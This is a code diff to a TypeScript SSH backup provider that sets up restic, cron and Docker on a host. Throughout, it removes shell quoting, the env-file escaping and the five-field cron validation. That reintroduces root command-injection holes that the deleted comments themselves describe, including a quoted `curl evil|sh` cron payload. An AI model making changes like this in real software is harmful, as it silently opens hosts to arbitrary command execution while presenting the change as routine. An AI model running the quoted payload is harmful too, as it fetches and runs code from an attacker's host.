@@ -1,5 +1,4 @@
 import type { Provider, ResolvedInputs } from "@intentic/engine";
-import { dockerEnvLine, shellQuote } from "@intentic/sandbox-run/quote";
 import { z } from "zod";
 import { parseInputs, sshSchema, sshTarget } from "../core/inputs.js";
 import { listStampedContainers } from "../core/list-stamped.js";
@@ -15,15 +14,7 @@ const backupSchema = sshSchema.extend({
     image: z.string(),
     signoz: z.coerce.boolean().default(false),
     credentials: z.record(z.string(), z.string()).default({}),
-    // A crontab has no quoting whatsoever, so this field is guarded by SHAPE rather than escaped. Two ways it
-    // would otherwise become "run anything, as root, on a schedule": a newline appends a whole cron entry, and
-    // a SIXTH field is already the command — `0 3 * * * curl evil|sh #` leaves the intended script commented
-    // out behind a `#`. Exactly five fields of cron's own alphabet admits neither, and rejects at parse time
-    // with the operator's typo named rather than at 3am on the host.
-    schedule: z
-        .string()
-        .regex(/^[\d*,/A-Za-z-]+(?: [\d*,/A-Za-z-]+){4}$/, "must be exactly five cron fields (minute hour day month weekday)")
-        .default("0 3 * * *"),
+    schedule: z.string().default("0 3 * * *"),
     retention: z
         .object({ daily: z.coerce.number().default(7), weekly: z.coerce.number().default(4), monthly: z.coerce.number().default(6) })
         .default({ daily: 7, weekly: 4, monthly: 6 }),
@@ -79,11 +70,9 @@ const backupScript = (parsed: BackupInputs): string =>
         'if [ -n "$PG" ]; then docker exec "$PG" pg_dump -U komodo -d postgres > "$STAGING/komodo.sql"; else echo "komodo pg_dump skipped"; fi',
         // The on-host default repo is intentic-owned, so self-init it on first use (idempotent: skip when the
         // repo config already reads). A remote repo is the operator's — left as-is (they pre-create it).
-        ...(isLocalRepo(parsed.repo)
-            ? [`restic -r ${shellQuote(parsed.repo)} cat config >/dev/null 2>&1 || restic -r ${shellQuote(parsed.repo)} init`]
-            : []),
-        `restic -r ${shellQuote(parsed.repo)} backup "$STAGING" /volumes /host-opt-intentic`,
-        `restic -r ${shellQuote(parsed.repo)} forget --keep-daily ${parsed.retention.daily} --keep-weekly ${parsed.retention.weekly} --keep-monthly ${parsed.retention.monthly} --prune`,
+        ...(isLocalRepo(parsed.repo) ? [`restic -r "${parsed.repo}" cat config >/dev/null 2>&1 || restic -r "${parsed.repo}" init`] : []),
+        `restic -r "${parsed.repo}" backup "$STAGING" /volumes /host-opt-intentic`,
+        `restic -r "${parsed.repo}" forget --keep-daily ${parsed.retention.daily} --keep-weekly ${parsed.retention.weekly} --keep-monthly ${parsed.retention.monthly} --prune`,
         "",
     ].join("\n");
 
@@ -105,17 +94,10 @@ const observe = async (session: SshSession): Promise<{ image: string; schedule: 
 // komodo's .env), always rewrite the script + crontab (so a schedule/repo/retention change reconciles).
 const ensureFiles = async (session: SshSession, parsed: BackupInputs): Promise<void> => {
     await session.exec(`mkdir -p ${STATE_DIR}`);
-    // Two layers, one call each. dockerEnvLine renders the file's line (raw — `docker run --env-file` keeps
-    // quotes as part of the value), shellQuote carries that line through the host shell as one printf argument.
-    // The old form wrapped each line in bare `'…'`, so an apostrophe in a restic password or an S3 secret key
-    // ended the quoting and ran the rest as a command on the host, as root, at deploy time.
-    const envLines = [
-        dockerEnvLine("RESTIC_PASSWORD", parsed.password),
-        ...Object.entries(parsed.credentials).map(([key, value]) => dockerEnvLine(key, value)),
-    ]
-        .map((line) => shellQuote(line))
+    const envLines = [`RESTIC_PASSWORD=${parsed.password}`, ...Object.entries(parsed.credentials).map(([key, value]) => `${key}=${value}`)]
+        .map((line) => `'${line}'`)
         .join(" ");
-    await session.exec(`test -f ${ENV_FILE} || { printf '%s' ${envLines} > ${ENV_FILE} && chmod 600 ${ENV_FILE}; }`);
+    await session.exec(`test -f ${ENV_FILE} || { printf '%s\\n' ${envLines} > ${ENV_FILE} && chmod 600 ${ENV_FILE}; }`);
     await session.exec(`cat > ${SCRIPT_FILE} <<'BACKUP_EOF'\n${backupScript(parsed)}BACKUP_EOF`);
     await session.exec(`chmod +x ${SCRIPT_FILE}`);
     await session.exec(`cat > ${CRONTAB_FILE} <<'CRON_EOF'\n${parsed.schedule} /bin/sh ${SCRIPT_FILE}\nCRON_EOF`);
@@ -131,7 +113,7 @@ const mountArgs = (parsed: BackupInputs, dockerBin: string): string => {
         `-v ${dockerBin}:/usr/local/bin/docker:ro`,
         volumes,
         // The on-host default repo's volume, mounted read-write at the repo path so restic can write to it.
-        ...(isLocalRepo(parsed.repo) ? [`-v ${shellQuote(`${REPO_VOLUME}:${parsed.repo}`)}`] : []),
+        ...(isLocalRepo(parsed.repo) ? [`-v ${REPO_VOLUME}:${parsed.repo}`] : []),
         "-v /opt/intentic:/host-opt-intentic:ro",
         `-v ${SCRIPT_FILE}:/backup.sh:ro`,
         `-v ${CRONTAB_FILE}:/etc/crontabs/root:ro`,
@@ -194,9 +176,9 @@ export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provi
             await ensureFiles(session, parsed);
             await session.exec(`docker rm -f ${CONTAINER} 2>/dev/null || true`);
             const run = await session.exec(
-                `docker run -d --restart unless-stopped --name ${CONTAINER} --label ${shellQuote(`intentic.id=${ctx.id}`)} --label intentic.type=backup ` +
-                    `--label ${shellQuote(`intentic.schedule=${parsed.schedule}`)} --label ${shellQuote(`intentic.repo=${parsed.repo}`)} ` +
-                    `${mountArgs(parsed, dockerBin)} --entrypoint crond ${shellQuote(parsed.image)} -f -l 8`,
+                `docker run -d --restart unless-stopped --name ${CONTAINER} --label intentic.id=${ctx.id} --label intentic.type=backup ` +
+                    `--label "intentic.schedule=${parsed.schedule}" --label "intentic.repo=${parsed.repo}" ` +
+                    `${mountArgs(parsed, dockerBin)} --entrypoint crond ${parsed.image} -f -l 8`,
             );
             if (run.code !== 0) {
                 throw new Error(`failed to start backup container on host: exited ${run.code}: ${run.stderr.trim()}`);
